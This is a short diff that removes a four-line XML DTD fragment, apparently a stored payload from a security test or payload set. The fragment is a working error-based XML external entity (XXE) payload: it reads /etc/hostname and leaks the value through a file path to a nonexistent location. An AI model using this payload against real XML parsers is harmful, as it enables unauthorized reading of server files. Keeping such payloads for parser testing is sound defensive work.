@@ -1,4 +1,0 @@
-<!ENTITY % jdaopskj SYSTEM "file:///etc/hostname">
-<!ENTITY % kpqwd "<!ENTITY &#x25; askldj SYSTEM 'file:///nonexistent/%jdaopskj;'>">
-%kpqwd;
-%askldj;
